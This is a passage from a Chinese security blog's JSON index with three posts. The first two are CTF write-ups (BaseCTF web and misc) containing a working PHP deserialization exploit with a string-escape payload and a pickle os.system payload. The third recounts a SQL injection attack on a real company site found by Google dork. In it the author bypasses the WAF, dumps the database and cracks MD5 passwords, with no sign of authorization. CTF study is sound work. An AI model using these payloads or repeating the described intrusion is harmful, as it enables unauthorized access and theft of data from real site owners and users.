E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; 然后Hacker类中绕过__wakeup方法，因为下面还有个赋值操作$this-\u0026gt;end = $this-\u0026gt;start，我们可以引用赋值来绕过\n1 2 $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; 到这利用链已经基本构造完了，注意源码中还有句throw new Exception(\u0026quot;杂鱼~杂鱼~\u0026quot;);抛出异常会导致__destruct析构方法无法执行从而导致反序列化过程失败\n绕过抛出异常就需要利用到PHP的GC垃圾回收机制，我举个例：本地开个php服务器执行以下代码进行测试\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $flag = \u0026#34;flag{test_flag}\u0026#34;; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET[\u0026#39;ctf\u0026#39;]); throw new Exception(\u0026#39;nonono\u0026#39;); 构造一个payload\n传入后发现提前执行了析构方法echo $flag,利用成功\n生成payload后别忘了手动将键名2改为1，不能直接写两个1，这样会导致value直接变为null\n1 $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); 最后就是substrstr函数，看似返回中括号内容和下文一致没什么错误\n1 2 3 4 5 6 7 8 function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } --------------- --- $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); 实际上生成的数据没有中括号而且前面还有三十八位无效数据影响反序列化\n本地尝试发现序列化数据被截取后是无法执行的\n关于mb_strpos和mb_substr的知识，\n1 2 3 4 5 6 每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节 每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节 每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节 unicode占4字节，mb_substr会将数据%f0abc中的ab拿去补全四字节，从而认为该数据只有c的一个字节 %f0%9fab这种则会保留最少一位b，所以又认为只有一字节 根据原先构造链输出我们需要的数据是不需要前面这38位的，可以利用以上知识利用字符串逃逸来截取掉这38位数据只留我们的payload\n最终exp，别忘了将生成数据键名改为1！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 $a = \u0026#34;%f0abc\u0026#34;; error_reporting(0); function substrstr($data)//提权中括号之间的内容 { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker { public $start; public $end; public $username = \u0026#34;ctfer\u0026#34;; public function __wakeup() { $this-\u0026gt;username = \u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct() { if (!preg_match(\u0026#39;/ctfer/i\u0026#39;, $this-\u0026gt;username)) { echo \u0026#39;Hacker！\u0026#39;; } } } class C { public $c; public function __toString() { $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T { public $t; public function __call($name, $args) { echo $this-\u0026gt;t-\u0026gt;t; } } class F { public $f; public function __get($name) { return isset($this-\u0026gt;f-\u0026gt;f); } } class E { public $e; public function __isset($name) { ($this-\u0026gt;e)(); } } class R { public $r; public function __invoke() { eval($this-\u0026gt;r); } } $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; $s6 = new Hacker(); $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); //echo serialize($s7).\u0026#34;\\n\u0026#34;; //echo urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; echo \u0026#34;?substr=\u0026#34;.str_repeat($a,12).\u0026#34;%f0%9fab\u0026amp;ez[ser.from_you=\u0026#34;.urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; payload\n1 %f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab\u0026amp;ez[ser.from_you=a%3A2%3A%7Bi%3A1%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A5%3A%22ctfer%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3BN%3B%7D solved!\n","date":"2024-09-12T17:26:54+08:00","permalink":"https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/","title":"BaseCTF招新赛 Web-Wp"},{"content":"发现方式 利用goole语法inurl=\u0026quot;id=\u0026quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n经过尝试发现是空格被过滤了，于是将空格用+替换。输入1'+and+'a'='a'--后页面报错，说明存在sql注入漏洞\n基本信息 1 2 3 4 5 ?id=1+union+select+database()-- ?id=1+union+select+version()-- ?id=1+union+select+user()-- 成功查询到当前库名：sanying mysql版本：5.7.43 user：sanying@127.0.0.1 这个版本是好多年前的了，高版本的用法不能在这用\n查库 在构造的时候又发现这个waf规则里面group_concat不能和括号连用，所以我们只能用limit一条一条查\n构造payload\n?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--\n发现只有两个库，其中一个还是系统库(°ー°〃)\n看来只用脱sanying库就行了，系统库就不管了\n查表 构造payload\n?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--\n后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共17张表\n查列名 查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可\n构造payload\n?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--\n然后写入脚本自动化查询每张表的列名\n查数据 到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭\n构造payload\n-1+union+select+{data[i]}+from+Sanying.{km}\n这里是从脚本里面复制出来的，我是先把列名处理成列表\n这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！\n成果 最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！\n免责声明： 目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。\n法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。\n责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。\n免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。\n出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。\n合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。\n持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。\n通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。\n","date":"2024-09-11T11:34:30+08:00","permalink":"https://2477231995.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"记一次真实站点sql注入漏洞"},{"content":" [!NOTE]\n这里我就只写一些有价值点的和我当时不会的题目的wp了\n[Week1] 捂住X只耳 下载音频后未发现频谱和音频波异常，听了下在音乐后半段有摩斯电码声音，所以我们需要将摩斯电码从音乐中分离出来以便识别\n先点击三个点分离立体声到单音道 点击左上角文件-\u0026gt;导出音频-\u0026gt;多个文件-\u0026gt;导出 成功导出两个wav\n打开Adobe Audition，左上角依次点击文件——新建——多轨会话——确定\n将刚才生成的两个wav拖入进多轨会话，然后双击未命名混音项目，再将两个wav拖入右边轨道\n双击一个轨道进入后上面工具栏点击——效果——反相 双击左侧未命名混音项目后点击左上角，选择导出，多轨混音，整个会话，选择导出位置后直接导出 将生成的mp3拖入audacity，点击三个点，频谱图。然后按住ctrl滑动滚轮放大可以看到明显的摩斯码，抄下来解密即可 [Week2] Base?! 这是一段xx-encode码，开始真没想到，随波逐流一把嗦即可\n[Week3] Base revenge 将以上文本base64隐写解密得到JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9\n将hint一键解码发现是atbash加密\n因为编码器解出来大小写有问题直接用[cyberchef](Atbash Cipher - CyberChef)\n再base64解码即可\n[Week3] broken.mp4 这道题挺简单的，两个视频用untrunc工具修复即可\n[Week3] 外星信号 音频播放就有莫斯码，先丢[在线网站](Morse Code Adaptive Audio Decoder | Morse Code World)听一下,前半部分flag在这里面，要转换小写\n音频使用foremost提取出压缩包里面有另一个音频，一听就知道是sstv，sstv我只推荐使用[这个脚本](colaclanth/sstv: SSTV Decoder (github.com))，软件又拉又麻烦,下面是用法\n1 sstv -d flag.mp3 -o result.png 提取出摩斯码图片如下\n和前面半段flag组合转换小写即可\n[Week3] 这是一个压缩包 这道题利用archpr工具的掩码破解，花了我n小时，感觉脚本会更快\n[Week4] Webshell 这道题先用wireshark提取出rar压缩包，解压发现是一套WordPress程序，这种博客没啥上传点吧，ai回答\nWordPress作为一款广泛使用的内容管理系统（CMS），其安全性一直备受关注。关于WordPress中容易被上传webshell的文件路径，可以从以下几个方面进行归纳： 主题文件夹： 路径示例：/wp-content/themes/[主题名称]/ 说明：WordPress允许用户通过后台上传和安装主题。黑客可能会将恶意代码（如webshell）嵌入到自定义主题中，并通过上传主题的方式将其部署到目标网站上。一旦主题被安装，webshell就可以被用来执行恶意命令或操纵网站。 插件文件夹：\n虽然问题中主要询问的是关于webshell上传的文件路径，但值得注意的是，插件文件夹也是潜在的安全风险点。 路径示例：/wp-content/plugins/[插件名称]/ 说明：与主题类似，插件也是WordPress扩展功能的重要方式。黑客可能会利用漏洞或恶意插件来上传webshell，从而控制网站。 上传文件夹：\n路径示例：/wp-content/uploads/ 说明：这是WordPress默认的媒体文件上传目录。虽然直接在这个文件夹中上传webshell可能受到WordPress的限制，但黑客可能会通过绕过安全检查或将webshell与合法文件捆绑上传的方式来达到目的。 自定义上传目录：\n路径示例：根据用户设置而定（如/wp-content/uploads/custom-directory/） 说明：WordPress允许用户通过修改配置或安装特定插件来更改默认的上传目录。如果这些自定义目录的安全设置不当，就可能成为黑客上传webshell的潜在目标。\n然后再插件目录下确实发现了\n转字符串后发现读取ui.js文件的内容\n目录下搜索ui.js，解码后发现很像@eval($_POST[\u0026rsquo;\u0026rsquo;])这种，但是传webshell的都使用了自定义函数和各种函数加编码，还是相当有水平的\n连接密码提交不对？再回去一看原来还有层rot13，解密提交即可\n[Week4] 二维码2-阿喀琉斯之踵 这道题用CQR纠错是不行的，里面二维码被添加了东西格式不对，用这个[项目](QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx))可以尝试爆破所有格式\n从图片导入qrcode-2.png 点击右上角tools 先选择爆破格式模式，然后再点击最上面提取信息 over\n[Week4] 小cheny的社交 这道题，嗯\u0026hellip;会了后有点没啥讲的了，我大体说下过程\nstegsolve看到一串字符，base64解码后再转16进制ascii得到一个QQ\n搜索QQ在她空间发现尊嘟假嘟编码，用[](尊嘟假嘟O.o (zdjd.asia))解码得到前半flag，然后还有个视频到b站搜评论下@了一个人点进去看到另外一串密文\n看着很像链接，用随波逐流梭哈搜索https发现链接\n进入链接博客又发现尊嘟假嘟编码，这里解码得到后半flag[](尊嘟假嘟O.o (zdjd.asia))\nPickle Init [Week3] [Week4] 学习文章，我也不会opcode\nPickle反序列化 - 枫のBlog (goodapple.top)\n题目源码\n1 2 3 #!/bin/bash echo \u0026#34;${GZCTF_FLAG}\u0026#34; \u0026gt; /flag python3 -c \u0026#34;__import__(\u0026#39;pickle\u0026#39;).loads(__import__(\u0026#39;sys\u0026#39;).stdin.read(50).encode(\u0026#39;ASCII\u0026#39;))\u0026#34; 贴个脚本，用pwntools发的，不然不好填50字节\n1 2 3 4 5 6 7 8 9 10 11 r1 = b\u0026#34;\u0026#34;\u0026#34;cos system (S\u0026#39;cat flag\u0026#39; tR.\u0026#34;\u0026#34;\u0026#34; from pwn import * s = remote(\u0026#39;challenge.basectf.fun\u0026#39;,41751) payload = r1.ljust(50,b\u0026#39;0\u0026#39;)\t#从左边填充0 s.sendline(payload) s.interactive() ","date":"2024-09-10T15:25:42+08:00","permalink":"https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/","title":"BaseCTF招新赛-Misc-wp"}]